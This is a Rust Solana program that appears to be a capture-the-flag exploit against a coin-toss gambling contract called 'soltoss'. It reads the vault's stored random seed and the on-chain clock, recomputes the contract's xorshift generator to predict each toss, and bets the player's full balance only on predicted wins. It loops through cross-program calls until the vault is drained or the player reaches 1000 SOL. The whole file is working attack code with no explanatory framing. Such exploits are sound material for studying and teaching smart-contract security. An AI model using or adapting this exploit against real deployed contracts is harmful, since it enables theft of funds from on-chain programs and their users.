use borsh::BorshDeserialize;
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    sysvar::{clock::Clock, Sysvar},
};

use soltoss::find_vault_pda;

#[derive(BorshDeserialize)]
pub struct VaultState {
    pub balance: u64,
    pub bump: u8,
    pub rand: u64,
}

fn xorshift(mut x: u64) -> u64 {
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    x *= 0x2545F4914F6CDD1D;
    return x;
}

pub fn process_instruction(
    _program: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let challenge_program = next_account_info(account_iter)?;
    let player = next_account_info(account_iter)?;
    let clock_account = next_account_info(account_iter)?;
    let vault_account = next_account_info(account_iter)?;
    let system_program = next_account_info(account_iter)?;

    let (vault_pda, _bump) = find_vault_pda(challenge_program.key);

    let current_balance = player.lamports();
    let target_balance = 1_000_000_000_000u64; // 1000 SOL
    if current_balance >= target_balance {
        return Ok(());
    }

    let vault_state = VaultState::deserialize(&mut &vault_account.data.borrow()[..])?;
    let mut vault_rand = vault_state.rand;
    let clock = Clock::from_account_info(clock_account)?;

    for _round in 0..12 {
        let current_balance = player.lamports();
        let vault_balance = vault_account.lamports();

        if current_balance >= target_balance {
            msg!(
                "Target reached! Final balance: {} lamports ({:.9} SOL)",
                current_balance,
                current_balance as f64 / 1_000_000_000.0
            );
            break;
        }

        let timestamp = clock.unix_timestamp as u64;

        let predicted_rand = vault_rand.wrapping_add(timestamp);
        let predicted_rand = xorshift(predicted_rand);
        let predicted_is_heads = predicted_rand % 10 == 0;

        let desired_bet = if predicted_is_heads {
            current_balance
        } else {
            1u64 // Do not bet when we predict TAILS
        };

        vault_rand = predicted_rand;

        let bet_amount = if vault_balance >= desired_bet {
            desired_bet
        } else {
            if vault_balance < desired_bet {
                vault_balance
            } else {
                desired_bet
            }
        };

        if bet_amount == 0 {
            msg!("Cannot place any bet due to insufficient vault balance");
            break;
        }

        let coin_toss_ix =
            soltoss::coin_toss(*challenge_program.key, *player.key, vault_pda, bet_amount);

        invoke(
            &coin_toss_ix,
            &[
                clock_account.clone(),
                player.clone(),
                vault_account.clone(),
                system_program.clone(),
            ],
        )?;
    }

    Ok(())
}
